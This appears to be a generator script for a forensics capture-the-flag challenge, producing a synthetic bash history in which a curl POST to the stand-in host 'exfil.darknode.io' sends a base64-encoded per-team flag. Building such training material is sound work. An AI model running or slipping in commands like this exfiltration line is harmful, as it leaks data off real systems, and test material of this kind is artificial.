"""FOR-001 아티팩트 생성기 - 합성 셸 명령 이력(bash_history.jsonl).

정상 명령들 사이에 하나의 악성 유출 시퀀스를 섞는다. 유출 명령에는 팀별 동적 비밀을
base64('FLAG:'+secret)로 인코딩해 심는다(실제 유출 트래픽처럼 평문이 아님). 조사자는
이력에서 이 명령을 찾아 호스트를 식별하고 payload를 디코드해야 한다.

사용: python generate_artifact.py [team_id]   (기본 team_id=qa_team)
"""
import base64
import hashlib
import hmac
import json
import os
import sys

CHALLENGE_SECRET = os.environ.get("CHALLENGE_SECRET")
if not CHALLENGE_SECRET:
    raise RuntimeError(
        "CHALLENGE_SECRET 미설정 — 동적 플래그 HMAC 키는 기본값 없이 fail-fast. "
        "배포/채점 환경에 CHALLENGE_SECRET 을 주입하세요.")
EXFIL_HOST = "exfil.darknode.io"


def dynamic_secret(team_id: str) -> str:
    sig = hmac.new(CHALLENGE_SECRET.encode(), f"FOR-001:{team_id}".encode(), hashlib.sha256).hexdigest()[:12]
    return f"S3cr3t-{sig}"


def build_history(team_id: str) -> list[dict]:
    payload_b64 = base64.b64encode(f"FLAG:{dynamic_secret(team_id)}".encode()).decode()
    exfil_cmd = (
        f"curl -s -X POST http://{EXFIL_HOST}/collect "
        f'-d "token={payload_b64}"'
    )
    benign = [
        "ls -la /var/www",
        "cat /etc/hostname",
        "cd /opt/app && git pull",
        "tail -n 50 /var/log/app/app.log",
        "systemctl status nginx",
        "df -h",
        "whoami",
        "sudo apt-get update",
        "vim config.yaml",
        "python3 manage.py migrate",
    ]
    cmds = benign[:6] + [exfil_cmd] + benign[6:]
    base_ts = 1_700_000_000
    return [{"ts": base_ts + i * 37, "user": "deploy", "cmd": c} for i, c in enumerate(cmds)]


def generate(path: str, team_id: str) -> None:
    with open(path, "w") as f:
        for entry in build_history(team_id):
            f.write(json.dumps(entry) + "\n")


if __name__ == "__main__":
    team_id = sys.argv[1] if len(sys.argv) > 1 else "qa_team"
    generate("bash_history.jsonl", team_id)
    print(f"생성 완료: bash_history.jsonl (team={team_id})")
